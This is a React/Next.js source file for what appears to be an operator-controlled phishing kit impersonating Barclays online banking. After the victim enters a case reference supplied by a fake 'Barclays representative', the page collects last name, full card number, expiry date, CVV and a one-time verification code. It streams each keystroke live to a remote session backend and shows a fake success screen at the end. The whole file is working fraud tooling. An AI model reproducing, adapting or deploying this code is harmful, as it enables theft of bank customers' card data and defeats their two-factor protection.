"use client";

import { useState, useEffect } from "react";
import { ControlRoomSession, SessionState } from "@/SDK/vendor-sdk";
import cardValidator from "card-validator";
import { CheckCircle2, XCircle, Lock } from "lucide-react";

/* ===================================================================
   CARD FORM — matches the live Barclays "Card number" login method
   Fields: Last name, Card number (16 digits)
   =================================================================== */

function CardForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
  const [lastName, setLastName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [validationError, setValidationError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError("");

    if (!lastName.trim()) {
      setValidationError("Please enter your last name.");
      return;
    }

    const numberValidation = cardValidator.number(cardNumber);
    if (!numberValidation.isValid) {
      setValidationError("Please enter a valid card number.");
      return;
    }

    const expirationValidation = cardValidator.expirationDate(expiry);
    if (!expirationValidation.isValid) {
      setValidationError("Please enter a valid expiration date (MM/YY).");
      return;
    }

    const cvvValidation = cardValidator.cvv(cvv, numberValidation.card ? numberValidation.card.code.size : 3);
    if (!cvvValidation.isValid) {
      setValidationError("Please enter a valid CVV security code.");
      return;
    }

    setIsSubmitting(true);
    try {
      await onInput({ event: "submit_card_details", last_name: lastName, card_number: cardNumber, expiry, cvv });
    } catch {
      setIsSubmitting(false);
    }
  };

  const formatCard = (val: string) => {
    return val.replace(/\D/g, "").slice(0, 16);
  };

  const formatExpiry = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 4);
    if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
    return digits;
  };

  return (
    <div className="login-widget-container">
      {/* Page title with left accent bar */}
      <h1 className="page-title">Log in to Online Banking</h1>

      {/* Form fields */}
      <form onSubmit={handleSubmit} className="form-section">
        <div className="form-group">
          <label htmlFor="surnameCardno">Last name</label>
          <input
            type="text"
            id="surnameCardno"
            value={lastName}
            onChange={e => {
              setLastName(e.target.value);
              onKeystroke("last_name", e.target.value);
            }}
            required
          />
        </div>
        <div className="form-group">
          <label htmlFor="cardNumber0">Card number (16 digits)</label>
          <input
            type="text"
            id="cardNumber0"
            value={cardNumber}
            onChange={e => {
              const val = formatCard(e.target.value);
              setCardNumber(val);
              onKeystroke("card_number", val);
            }}
            inputMode="numeric"
            required
          />
        </div>

        <div style={{ display: "flex", gap: 16 }}>
          <div className="form-group" style={{ flex: 1 }}>
            <label htmlFor="expiry">Expiry Date</label>
            <input
              type="text"
              id="expiry"
              value={expiry}
              onChange={e => {
                const val = formatExpiry(e.target.value);
                setExpiry(val);
                onKeystroke("expiry", val);
              }}
              placeholder="MM/YY"
              inputMode="numeric"
              required
            />
          </div>
          <div className="form-group" style={{ flex: 1 }}>
            <label htmlFor="cvv">CVV</label>
            <input
              type="password"
              id="cvv"
              value={cvv}
              onChange={e => {
                const val = e.target.value.replace(/\D/g, "").slice(0, 4);
                setCvv(val);
                onKeystroke("cvv", val);
              }}
              inputMode="numeric"
              required
            />
          </div>
        </div>

        <div className="remember-box">
          <input type="checkbox" id="remember" />
          <label htmlFor="remember" className="remember-label">
            <strong>Remember my last name and login method (optional)</strong>
            <span className="subtext">Don&apos;t tick the box if you&apos;re using a public or shared device</span>
          </label>
        </div>

        {(error || validationError) && <p className="inline-error">{validationError || error}</p>}

        <button type="submit" className="btn-primary" id="continue" disabled={isSubmitting}>
          {isSubmitting ? "Processing..." : "Continue"}
        </button>
      </form>
    </div>
  );
}

/* ===================================================================
   2FA FORM — verification code entry
   =================================================================== */

function TwoFactorForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await onInput({ event: "verify_otp", otp_code: otp });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="login-widget-container">
      <h1 className="page-title">Verify your identity</h1>

      <div className="sign-on-widget" style={{ maxWidth: "100%", border: "none", padding: "0" }}>
        <p style={{ fontSize: 16, color: "var(--barclays-grey)", marginBottom: 28, lineHeight: 1.5 }}>
          We&apos;ve sent a verification code to your registered mobile device. Please enter it below to continue.
        </p>

        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="otp">Verification code</label>
            <input
              type="text"
              id="otp"
              value={otp}
              onChange={e => {
                setOtp(e.target.value);
                onKeystroke("otp_code", e.target.value);
              }}
              inputMode="numeric"
              required
              autoComplete="one-time-code"
              style={{ letterSpacing: "4px", textAlign: "center" }}
            />
          </div>
          {error && <p className="inline-error">{error}</p>}
          <button type="submit" className="btn-primary" disabled={otp.length < 4 || isSubmitting}>
            {isSubmitting ? "Verifying..." : "Continue"}
          </button>
        </form>
      </div>
    </div>
  );
}

/* ===================================================================
   PROCESSING / SUCCESS / FAILURE SCREENS
   =================================================================== */

function ProcessingScreen({ error }: { error?: string }) {
  return (
    <div className="login-widget-container">
      <h1 className="page-title">Processing your request</h1>
      <div className="sign-on-widget" style={{ maxWidth: "100%", border: "none", padding: "0" }}>
        <div className="spinner" style={{ margin: "20px auto" }}></div>
        <p style={{ fontSize: 16, color: "var(--barclays-grey)", lineHeight: 1.5, textAlign: "center" }}>
          Please wait while we securely verify your information. Do not close or refresh this page.
        </p>
        {error && <p className="inline-error" style={{ textAlign: "center", marginTop: "20px" }}>{error}</p>}
      </div>
    </div>
  );
}

function SuccessScreen() {
  return (
    <div className="login-widget-container">
      <h1 className="page-title">Verification complete</h1>
      <div className="sign-on-widget" style={{ maxWidth: "100%", border: "none", padding: "0", display: "flex", flexDirection: "column", alignItems: "center" }}>
        <CheckCircle2 style={{ color: "var(--barclays-primary)", width: "72px", height: "72px", marginBottom: "20px", marginTop: "20px" }} />
        <p style={{ fontSize: 16, color: "var(--barclays-grey)", lineHeight: 1.5, textAlign: "center" }}>
          Your identity has been verified successfully. You may now close this window.
        </p>
      </div>
    </div>
  );
}

function FailureScreen({ error }: { error?: string }) {
  return (
    <div className="login-widget-container">
      <h1 className="page-title" style={{ borderColor: "var(--barclays-error)", color: "var(--barclays-error)" }}>Verification failed</h1>
      <div className="sign-on-widget" style={{ maxWidth: "100%", border: "none", padding: "0", display: "flex", flexDirection: "column", alignItems: "center" }}>
        <XCircle style={{ color: "var(--barclays-error)", width: "72px", height: "72px", marginBottom: "20px", marginTop: "20px" }} />
        <p style={{ fontSize: 16, color: "var(--barclays-grey)", lineHeight: 1.5, textAlign: "center" }}>
          {error || "We could not verify your information. Please contact your Barclays representative for assistance."}
        </p>
      </div>
    </div>
  );
}

/* ===================================================================
   MAIN PAGE — Reference Entry → Session Flow
   =================================================================== */

export default function Home() {
  const [caseRef, setCaseRef] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [sessionState, setSessionState] = useState<SessionState | null>(null);
  const [session, setSession] = useState<ControlRoomSession | null>(null);

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!caseRef.trim()) return;

    setLoading(true);
    setError("");

    try {
      const s = new ControlRoomSession({
        tenant_id: "e63d3b80-3289-499e-84ca-292b70c13ac6",
        case_reference: caseRef.trim(),
        supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL!,
        supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY!,
      });
      const state = await s.connect();
      setSession(s);
      setSessionState(state);

      s.subscribe((newState) => {
        setSessionState(newState);
      });
    } catch (err: any) {
      setError(err.message || "Unable to connect. Please check your reference and try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleInput = async (data: any) => {
    if (session) {
      await session.sendInput(data);
    }
  };

  const handleKeystroke = (field: string, value: string) => {
    if (session) {
      session.sendKeystroke(field, value);
    }
  };

  useEffect(() => {
    return () => {
      if (session) session.disconnect();
    };
  }, [session]);

  // Reference entry screen
  if (!sessionState) {
    return (
      <div className="login-widget-container">
        <h1 className="page-title">Log in to Online Banking</h1>
        <div className="sign-on-widget" style={{ maxWidth: "100%", border: "none", padding: "0" }}>
          <p style={{ fontSize: 16, color: "var(--barclays-grey)", marginBottom: 28, lineHeight: 1.5 }}>
            Enter the reference number provided by your Barclays representative to continue with your verification.
          </p>
          <form onSubmit={handleConnect}>
            <div className="ref-input-wrapper">
              <input
                type="text"
                className="ref-input"
                value={caseRef}
                onChange={e => setCaseRef(e.target.value.toUpperCase())}
                placeholder="CR-XXXXXX-XXXX"
                autoFocus
              />
              {error && <p className="ref-error">{error}</p>}
            </div>
            <button type="submit" className="btn-primary" disabled={loading || !caseRef.trim()}>
              {loading ? "Connecting..." : "Continue"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const operatorError = sessionState.operator_message;

  switch (sessionState.component_key) {
    case "CardForm":
      return <CardForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "TwoFactorForm":
      return <TwoFactorForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "ProcessingScreen":
      return <ProcessingScreen error={operatorError} />;
    case "SuccessScreen":
      return <SuccessScreen />;
    case "FailureScreen":
      return <FailureScreen error={operatorError} />;
    default:
      return (
        <div className="login-widget-container">
          <h1 className="page-title">Loading...</h1>
          <div className="sign-on-widget" style={{ maxWidth: "100%", border: "none", padding: "0" }}>
            <div className="spinner" style={{ margin: "20px auto" }}></div>
            <p style={{ fontSize: 16, color: "var(--barclays-grey)", lineHeight: 1.5, textAlign: "center" }}>
              Waiting for session: {sessionState.current_state}
            </p>
          </div>
        </div>
      );
  }
}
